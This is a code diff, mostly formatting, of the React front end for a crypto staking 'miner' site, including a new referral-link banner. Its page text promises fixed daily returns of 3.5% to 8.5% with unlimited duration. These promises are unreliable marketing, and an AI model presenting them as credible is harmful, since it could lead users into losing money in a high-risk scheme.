+                                fontWeight: "bolder",
+                                color: "#ffbb00"
+                            }}
                         >
                             <span>Audit </span>
                             {/* <TwitterIcon/> */}
@@ -969,11 +888,11 @@ function WealthMountain() {
                     </Item>
                     <Item>
                         <a href="https://bscscan.com/address/0xbcae54cdf6a1b1c60ec3d44114b452179a96c1e3" target="_blank" rel="noreferrer"
-                        style={{
-                            textDecoration: 'none',
-                            fontWeight: "bolder",
-                            color:"#ffbb00"
-                        }}
+                            style={{
+                                textDecoration: 'none',
+                                fontWeight: "bolder",
+                                color: "#ffbb00"
+                            }}
                         >
                             <span>Contract </span>
                             {/* <SiBinance/> */}
@@ -981,51 +900,53 @@ function WealthMountain() {
                     </Item>
                     <Item>
                         <a href="/whitepaper.pdf" target="_blank"
-                        style={{
-                            textDecoration: 'none',
-                            fontWeight: "bolder",
-                            color:"#ffbb00"
-                        }}
+                            style={{
+                                textDecoration: 'none',
+                                fontWeight: "bolder",
+                                color: "#ffbb00"
+                            }}
                         >
                             <span>Whitepaper</span>
                             {/* <FaDiscord/> */}
                         </a>
                     </Item>
-                    <Item style={{border: "solid #ffbb00 4px"}}>
+                    <Item style={{ border: "solid #ffbb00 4px" }}>
                         <a href="https://lottery.wcminer.com/" target="__blank"
-                        style={{
-                            textDecoration: 'none',
-                            fontWeight: "bolder",
-                            color:"#ffbb00"
-                        }}
+                            style={{
+                                textDecoration: 'none',
+                                fontWeight: "bolder",
+                                color: "#ffbb00"
+                            }}
                         >
-                        <span>Lottery </span>
-                        {/* <TelegramIcon/> */}
+                            <span>Lottery </span>
+                            {/* <TelegramIcon/> */}
                         </a>
                     </Item>
                 </div>
-                
+
                 <Button
                     className='custom-button desktop-button'
-                    style={{maxHeight: "43px", backgroundColor:'#000000b8', color:'#ffbb00'}}
+                    style={{ maxHeight: "43px", backgroundColor: '#000000b8', color: '#ffbb00' }}
                     onClick={requestAccount}>
                     {connectButtonText}
                 </Button>
-                <div 
+                <div
                     className='mobile_btn'
                     onClick={() => {
                         setMobile(true)
                     }}
                 >
-                    <GiHamburgerMenu/>
+                    <GiHamburgerMenu />
                 </div>
             </div>
             <Container>
                 <div
-                    style={{width:'100%', padding:'15px'}}
-                    onClick={()=>{window.open("https://defidetective.app/")}}
-                    >
+                    style={{ width: '100%', padding: '15px' }}
+                    // onClick={() => { window.open("https://demountain.finance?ref=0x5886b6b942f8dab2488961f603a4be8c3015a1a9")}}
+                >
+                    <a href="https://busd.demountain.finance/auction/?ref=0x5886b6b942f8dab2488961f603a4be8c3015a1a9" target="_blank">
                     <video src={ lotteryBanner } playsInline loop={true} muted="unmuted" width="100%" style={{borderRadius:'8px', cursor:'pointer'}} ref={videoRef}></video>
+                    </a>
                 </div>
             </Container>
             {/* <Container>
@@ -1091,10 +1012,10 @@ function WealthMountain() {
                         <Card body className="text-center text-lightblue">
                             <h4 className="calvino text-lightblue">Total Earnings</h4>
                             <CardDeck>
-                                <Card style={{background: "transparent"}}>
+                                <Card style={{ background: "transparent" }}>
                                     <h4 className="source font-weight-bold text-white"><TotalEarnedPercent /></h4>
                                 </Card>
-                                <Card style={{background: "transparent"}}>
+                                <Card style={{ background: "transparent" }}>
                                     <h4 className="source font-weight-bold text-white">$<TotalEarnedValue /></h4>
                                 </Card>
                             </CardDeck>
@@ -1196,93 +1117,93 @@ function WealthMountain() {
 
                     <Parallax strength={500}>
                         <div>
-                        <Container className="pb-3 pt-3 calvino text-center">
-                            <CardDeck>
-                            <Card /*data-aos="fade-right" data-aos-duration="800" */className="p-3">
-                                <h3>Dividends</h3>
+                            <Container className="pb-3 pt-3 calvino text-center">
+                                <CardDeck>
+                                    <Card /*data-aos="fade-right" data-aos-duration="800" */ className="p-3">
+                                        <h3>Dividends</h3>
 
-                                <table className="source" border="2">
-                                <tbody>
-                                    <tr>
-                                    <td className="font-weight-bold">Level</td>
-                                    <td className="font-weight-bold">Stake Length</td>
-                                    <td className="font-weight-bold">Earnings</td>
-                                    </tr>
-                                    <tr>
-                                    <td>1</td>
-                                    <td>Day 1 - 20</td>
-                                    <td>3.5% daily</td>
-                                    </tr>
-                                    <tr>
-                                    <td>2</td>
-                                    <td>Day 20 - 30</td>
-                                    <td>4.5% daily</td>
-                                    </tr>
-                                    <tr>
-                                    <td>3</td>
-                                    <td>Day 30 - 40</td>
-                                    <td>5.5% daily</td>
-                                    </tr>
-                                    <tr>
-                                    <td>4</td>
-                                    <td>Day 40 - 50</td>
-                                    <td>6.5% daily</td>
-                                    </tr>
-                                    <tr>
-                                    <td>♛ 5 </td>
-                                    <td>Day 50 - ∞</td>
-                                    <td>8.5% daily</td>
-                                    </tr>
-                                </tbody>
-                                </table>
-                                <br />
-                                <small className="source">Compounding and collecting earnings from dividends reset all stakes to level 1. Creating new stakes has no effect on existing stakes.</small>
-                                <br />
+                                        <table className="source" border="2">
+                                            <tbody>
+                                                <tr>
+                                                    <td className="font-weight-bold">Level</td>
+                                                    <td className="font-weight-bold">Stake Length</td>
+                                                    <td className="font-weight-bold">Earnings</td>
+                                                </tr>
+                                                <tr>
+                                                    <td>1</td>
+                                                    <td>Day 1 - 20</td>
+                                                    <td>3.5% daily</td>
+                                                </tr>
+                                                <tr>
+                                                    <td>2</td>
+                                                    <td>Day 20 - 30</td>
+                                                    <td>4.5% daily</td>
+                                                </tr>
+                                                <tr>
+                                                    <td>3</td>
+                                                    <td>Day 30 - 40</td>
+                                                    <td>5.5% daily</td>
+                                                </tr>
+                                                <tr>
+                                                    <td>4</td>
+                                                    <td>Day 40 - 50</td>
+                                                    <td>6.5% daily</td>
+                                                </tr>
+                                                <tr>
+                                                    <td>♛ 5 </td>
+                                                    <td>Day 50 - ∞</td>
+                                                    <td>8.5% daily</td>
+                                                </tr>
+                                            </tbody>
+                                        </table>
+                                        <br />
+                                        <small className="source">Compounding and collecting earnings from dividends reset all stakes to level 1. Creating new stakes has no effect on existing stakes.</small>
+                                        <br />
 
-                                <small className="source">Disclaimer: Dividend payouts are fixed and the TVL fluctuations do not effect the daily yield like in traditional miners.</small>
-                            </Card>
-                            <Card /*data-aos="fade-down" data-aos-duration="800"*/ className="p-3">
-                                <h3>Unstake Fees</h3>
-                                <table className="source" border="2">
-                                <tbody>
-                                    <tr>
-                                    <td className="font-weight-bold">Stake Length</td>
-                                    <td className="font-weight-bold">Unstake Fee</td>
-                                    </tr>
-                                    <tr>
-                                    <td>Day 1 - 10</td>
-                                    <td>20%</td>
-                                    </tr>
-                                    <tr>
-                                    <td>Day 10 - 20</td>
-                                    <td>18%</td>
-                                    </tr>
-                                    <tr>
-                                    <td>Day 20 - 30</td>
-                                    <td>15%</td>
-                                    </tr>
-                                    <tr>
-                                    <td>Day 30 - ∞</td>
-                                    <td>12%</td>
-                                    </tr>
-                                </tbody>
-                                </table>
-                                <br /><small className="source">Dividends earned are also paid out when unstakes take place.</small>
-                                <br /><small className="source">Volume in and out of the protocol help the platform thrive. Fees are diversified across different asset classes and diversification vehicles.</small>
-                            </Card>
-                            <Card /*data-aos="fade-left" data-aos-duration="800"*/ className="p-3">
-                                <h3>Staking</h3>
-                                <span className="source text-center pl-2 pb-2 pr-3">
-                                10% fee on intial stakes<br /><br />
-                                Stakes immediately start earning 3.5% daily<br /><br />
-                                Unstake at any time (earnings included)<br /><br />
-                                Unstake fees start at 20% and decrease to 12%<br /><br />
-                                10% fee on dividend collections<br /><br />
-                                No fees on compounds
-                                </span>
-                            </Card>
-                            </CardDeck>
-                        </Container>
+                                        <small className="source">Disclaimer: Dividend payouts are fixed and the TVL fluctuations do not effect the daily yield like in traditional miners.</small>
+                                    </Card>
+                                    <Card /*data-aos="fade-down" data-aos-duration="800"*/ className="p-3">
+                                        <h3>Unstake Fees</h3>
+                                        <table className="source" border="2">
+                                            <tbody>
+                                                <tr>
+                                                    <td className="font-weight-bold">Stake Length</td>
+                                                    <td className="font-weight-bold">Unstake Fee</td>
+                                                </tr>
+                                                <tr>
+                                                    <td>Day 1 - 10</td>
+                                                    <td>20%</td>
+                                                </tr>
+                                                <tr>
+                                                    <td>Day 10 - 20</td>
+                                                    <td>18%</td>
+                                                </tr>
+                                                <tr>
+                                                    <td>Day 20 - 30</td>
+                                                    <td>15%</td>
+                                                </tr>
+                                                <tr>
+                                                    <td>Day 30 - ∞</td>
+                                                    <td>12%</td>
+                                                </tr>
+                                            </tbody>
+                                        </table>
+                                        <br /><small className="source">Dividends earned are also paid out when unstakes take place.</small>
+                                        <br /><small className="source">Volume in and out of the protocol help the platform thrive. Fees are diversified across different asset classes and diversification vehicles.</small>
+                                    </Card>
+                                    <Card /*data-aos="fade-left" data-aos-duration="800"*/ className="p-3">
+                                        <h3>Staking</h3>
+                                        <span className="source text-center pl-2 pb-2 pr-3">
+                                            10% fee on intial stakes<br /><br />
+                                            Stakes immediately start earning 3.5% daily<br /><br />
+                                            Unstake at any time (earnings included)<br /><br />
+                                            Unstake fees start at 20% and decrease to 12%<br /><br />
+                                            10% fee on dividend collections<br /><br />
+                                            No fees on compounds
+                                        </span>
+                                    </Card>
+                                </CardDeck>
+                            </Container>
                         </div>
                     </Parallax>
                 </TabPanel>
@@ -1290,98 +1211,98 @@ function WealthMountain() {
                 <TabPanel value={activeTab} selectedIndex={2}>
                     <h4 className="pt-5 text-center text-white">(COMING SOON)</h4>
                     <CardDeck className="p-5">
-                        
+
                         <Card body className="text-center text-lightblue">
                             <h4 className="calvino text-lightblue">LOTTERY</h4>
 
                             <Box component="div" className='p-2 pb-5'>
                                 <Grid
-                                container
-                                alignItems="center"
-                                justifyContent="space-between"
+                                    container
+                                    alignItems="center"
+                                    justifyContent="space-between"
                                 >
-                                    <Typography style={{fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold'}} gutterBottom>
+                                    <Typography style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                         POT SIZE
                                     </Typography>
-                                    <Typography className="text-white" style={{fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold'}} gutterBottom>
+                                    <Typography className="text-white" style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                         $0
                                     </Typography>
                                 </Grid>
 
                                 <Grid
-                                container
-                                alignItems="center"
-                                justifyContent="space-between"
+                                    container
+                                    alignItems="center"
+                                    justifyContent="space-between"
                                 >
-                                    <Typography style={{fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold'}} gutterBottom>
+                                    <Typography style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                         TOTAL PLAYERS
                                     </Typography>
-                                    <Typography className="text-white" style={{fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold'}} gutterBottom>
+                                    <Typography className="text-white" style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                         0
                                     </Typography>
                                 </Grid>
 
                                 <Grid
-                                container
-                                alignItems="center"
-                                justifyContent="space-between"
+                                    container
+                                    alignItems="center"
+                                    justifyContent="space-between"
                                 >
-                                    <Typography style={{fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold'}} gutterBottom>
+                                    <Typography style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                         TOTAL TICKETS
                                     </Typography>
-                                    <Typography className="text-white" style={{fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold'}} gutterBottom>
+                                    <Typography className="text-white" style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                         0
                                     </Typography>
                                 </Grid>
 
                                 <Grid
-                                container
-                                alignItems="center"
-                                justifyContent="space-between"
+                                    container
+                                    alignItems="center"
+                                    justifyContent="space-between"
                                 >
-                                    <Typography style={{fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold'}} gutterBottom>
+                                    <Typography style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                         MY TICKETS
                                     </Typography>
-                                    <Typography className="text-white" style={{fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold'}} gutterBottom>
+                                    <Typography className="text-white" style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                         0
                                     </Typography>
                                 </Grid>
 
                                 <Grid
-                                container
-                                alignItems="center"
-                                justifyContent="space-between"
+                                    container
+                                    alignItems="center"
+                                    justifyContent="space-between"
                                 >
-                                    <Typography style={{fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold'}} gutterBottom>
+                                    <Typography style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                         PROBABILITY OF WINNING
                                     </Typography>
-                                    <Typography className="text-white" style={{fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold'}} gutterBottom>
+                                    <Typography className="text-white" style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                         0
                                     </Typography>
                                 </Grid>
 
                                 <Grid
-                                container
-                                alignItems="center"
-                                justifyContent="space-between"
+                                    container
+                                    alignItems="center"
+                                    justifyContent="space-between"
                                 >
-                                    <Typography style={{fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold'}} gutterBottom>
+                                    <Typography style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                         PREVIOUS WINNER
                                     </Typography>
-                                    <Typography className="text-white" style={{fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold'}} gutterBottom>
+                                    <Typography className="text-white" style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                         0
                                     </Typography>
                                 </Grid>
 
                                 <Grid
-                                container
-                                alignItems="center"
-                                justifyContent="space-between"
+                                    container
+                                    alignItems="center"
+                                    justifyContent="space-between"
                                 >
-                                    <Typography style={{fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold'}} gutterBottom>
+                                    <Typography style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                         PREVIOUS POT SIZE
                                     </Typography>
-                                    <Typography className="text-white" style={{fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold'}} gutterBottom>
+                                    <Typography className="text-white" style={{ fontFamily: 'Open Sans', fontSize: '16px', fontWeight: 'bold' }} gutterBottom>
                                         0
                                     </Typography>
                                 </Grid>
@@ -1399,87 +1320,91 @@ function WealthMountain() {
                                 </FormGroup>
                             </Form>
 
-                            <Button className="custom-button source mt-3" style={{width: '100%'}} outline onClick={()=>{}} disabled>buy tickets</Button>
-                            <Button className="custom-button source mt-3" style={{width: '100%'}} outline onClick={()=>{}} disabled>collect winnings</Button>
-                            <Button className="custom-button source mt-3" style={{width: '100%'}} outline onClick={()=>{}} disabled>send to miner (100% bonus)</Button>
+                            <Button className="custom-button source mt-3" style={{ width: '100%' }} outline onClick={() => { }} disabled>buy tickets</Button>
+                            <Button className="custom-button source mt-3" style={{ width: '100%' }} outline onClick={() => { }} disabled>collect winnings</Button>
+                            <Button className="custom-button source mt-3" style={{ width: '100%' }} outline onClick={() => { }} disabled>send to miner (100% bonus)</Button>
                         </Card>
                     </CardDeck>
                 </TabPanel>
 
-                { activeTab !== 2 &&
-                <Container className="pt-3">
-                    <Card body>
-                        <h2 className="calvino text-center text-lightblue">Earnings Calculator</h2>
-                        <CardDeck>
-                            <Card body className="text-center">
-                                <h3 className="calvino font-weight-bold text-lightblue">Staking</h3>
-                                <Form>
-                                    <FormGroup>
-                                        <Label className="source font-weight-bold text-lightblue">Stake Amount</Label>
-                                        <InputGroup>
-                                            <Input
-                                                className="custom-input text-center source"
-                                                placeholder="Minimum 50 BUSD"
-                                                // onChange={(e) => this.setCalcAmount(`${e.target.value}`)}
-                                                onChange={updateCalc}
-                                            ></Input>
-                                        </InputGroup>
-                                    </FormGroup>
-                                </Form>
-                                <Label className="source font-weight-bold text-lightblue">Days Staked</Label>
-                                <Col className="text-center">
-                                    <Box>
-                                        <Slider
-                                            defaultValue={50}
-                                            aria-label="Default"
-                                            valueLabelDisplay="auto"
-                                            color='primary'
-                                            onChange={(_, v) => calculate(v)} />
-                                    </Box>
-                                </Col>
-                            </Card>
-                            <Card body className="text-center">
-                                <h3 className="calvino font-weight-bold text-lightblue">Earnings</h3>
-                                <CardDeck>
-                                    <Card style={{ background: 'rgba(0, 0, 0, 0.5)' }}>
-                                        <h3 className="calvino text-white">${calcTotalDividends}</h3>
-                                        <small className="source text-white">total dividends earned</small>
-                                    </Card>
-                                    <Card style={{ background: 'rgba(0, 0, 0, 0.5)' }}>
-                                        <h3 className="calvino text-white">${initalStakeAfterFees}</h3>
-                                        <small className="source text-white">initial stake after fees</small>
-                                    </Card>
-                                </CardDeck>
-                                <CardDeck className="pt-3">
-                                    <Card style={{ background: 'rgba(0, 0, 0, 0.5)' }}>
-                                        <h3 className="calvino text-white">{dailyPercent}%</h3>
-                                        <small className="source text-white">earning daily (%)</small>
-                                    </Card>
-                                    <Card style={{ background: 'rgba(0, 0, 0, 0.5)' }}>
-                                        <h3 className="calvino text-white">${dailyValue}</h3>
-                                        <small className="source text-white">earning daily ($)</small>
-                                    </Card>
-                                </CardDeck>
-                            </Card>
-                        </CardDeck>
-                    </Card>
-                </Container>
+                {activeTab !== 2 &&
+                    <Container className="pt-3">
+                        <Card body>
+                            <h2 className="calvino text-center text-lightblue">Earnings Calculator</h2>
+                            <CardDeck>
+                                <Card body className="text-center">
+                                    <h3 className="calvino font-weight-bold text-lightblue">Staking</h3>
+                                    <Form>
+                                        <FormGroup>
+                                            <Label className="source font-weight-bold text-lightblue">Stake Amount</Label>
+                                            <InputGroup>
+                                                <Input
+                                                    className="custom-input text-center source"
+                                                    placeholder="Minimum 50 BUSD"
+                                                    // onChange={(e) => this.setCalcAmount(`${e.target.value}`)}
+                                                    onChange={updateCalc}
+                                                ></Input>
+                                            </InputGroup>
+                                        </FormGroup>
+                                    </Form>
+                                    <Label className="source font-weight-bold text-lightblue">Days Staked</Label>
+                                    <Col className="text-center">
+                                        <Box>
+                                            <Slider
+                                                defaultValue={50}
+                                                aria-label="Default"
+                                                valueLabelDisplay="auto"
+                                                color='primary'
+                                                onChange={(_, v) => calculate(v)} />
+                                        </Box>
+                                    </Col>
+                                </Card>
+                                <Card body className="text-center">
+                                    <h3 className="calvino font-weight-bold text-lightblue">Earnings</h3>
+                                    <CardDeck>
+                                        <Card style={{ background: 'rgba(0, 0, 0, 0.5)' }}>
+                                            <h3 className="calvino text-white">${calcTotalDividends}</h3>
+                                            <small className="source text-white">total dividends earned</small>
+                                        </Card>
+                                        <Card style={{ background: 'rgba(0, 0, 0, 0.5)' }}>
+                                            <h3 className="calvino text-white">${initalStakeAfterFees}</h3>
+                                            <small className="source text-white">initial stake after fees</small>
+                                        </Card>
+                                    </CardDeck>
+                                    <CardDeck className="pt-3">
+                                        <Card style={{ background: 'rgba(0, 0, 0, 0.5)' }}>
+                                            <h3 className="calvino text-white">{dailyPercent}%</h3>
+                                            <small className="source text-white">earning daily (%)</small>
+                                        </Card>
+                                        <Card style={{ background: 'rgba(0, 0, 0, 0.5)' }}>
+                                            <h3 className="calvino text-white">${dailyValue}</h3>
+                                            <small className="source text-white">earning daily ($)</small>
+                                        </Card>
+                                    </CardDeck>
+                                </Card>
+                            </CardDeck>
+                        </Card>
+                    </Container>
                 }
-                
+
             </Container>
-            <div style={{margin: "50px 20px", textAlign: 'center', alignItems:'center', color:'white'}}>
-                <h2 className='text-white' style={{fontWeight:'bold', margin:'80px 0px 50px 0px'}}>EARN 3.3% DAILY REWARDS ON WC MINER BNB</h2>
-                <div style={{display:'flex', justifyContent:'center'}}>
-                    <div style={{background:'black', border:'solid 3px #fa9a00', borderRadius:'20px', padding:'50px 80px '}}>
-                        <h2 className='text-white' style={{fontWeight:'bold', marginBottom:'30px'}}>MINER</h2>
-                        <a href="https://wcminer.com/" target="_blank" style={{fontSize:'20px', fontWeight:'600', background:'#ffbb00', padding:'10px 50px', borderRadius:'10px'}}>
+            <div style={{ margin: "50px 20px", textAlign: 'center', alignItems: 'center', color: 'white' }}>
+                <h2 className='text-white' style={{ fontWeight: 'bold', margin: '80px 0px 50px 0px' }}>EARN 3.3% DAILY REWARDS ON WC MINER BNB</h2>
+                <div style={{ display: 'flex', justifyContent: 'center' }}>
+                    <div style={{ background: 'black', border: 'solid 3px #fa9a00', borderRadius: '20px', padding: '50px 80px ' }}>
+                        <h2 className='text-white' style={{ fontWeight: 'bold', marginBottom: '30px' }}>MINER</h2>
+                        <a href="https://wcminer.com/" target="_blank" style={{ fontSize: '20px', fontWeight: '600', background: '#ffbb00', padding: '10px 50px', borderRadius: '10px' }}>
                             <span className='source'>INVEST</span>
                         </a>
                     </div>
                 </div>
             </div>
+            {/* <div style={{display:'flex', justifyContent:'center'}}> */}
+                {/* { console.log("investInfo=======> ",  investInfo) } */}
+                {/* <RealTimeChart investInfo={investInfo} /> */}
+            {/* </div> */}
             <div className="pt-5 text-center calvino text-lightblue">
-                <Card style={{borderRadius: '0px', padding:'70px 10px 50px 10px'}}>
+                <Card style={{ borderRadius: '0px', padding: '70px 10px 50px 10px' }}>
                     <CardDeck className="custom-footer">
                         <a href="https://georgestamp.xyz/2022/09/wc-miner-busd/" target="_blank" rel="noreferrer"> AUDIT </a>
                         <a href="https://bscscan.com/address/0xbcae54cdf6a1b1c60ec3d44114b452179a96c1e3" target="_blank" rel="noreferrer"> CONTRACT </a>
@@ -1487,7 +1412,7 @@ function WealthMountain() {
                         <a href="https://twitter.com/WolfOfCrypto885" target="_blank" rel="noreferrer"> TWITTER </a>
                         <a href="https://t.me/WCMinerBUSD" target="_blank" rel="noreferrer"> TELEGRAM </a>
                     </CardDeck>
-                    <p style={{fontSize: '20px', color:'white', paddingTop:'30px', fontWeight:'bold'}}>© Wolf of Crypto Team , All Rights Reserved</p>
+                    <p style={{ fontSize: '20px', color: 'white', paddingTop: '30px', fontWeight: 'bold' }}>© Wolf of Crypto Team , All Rights Reserved</p>
                 </Card>
             </div>
         </>
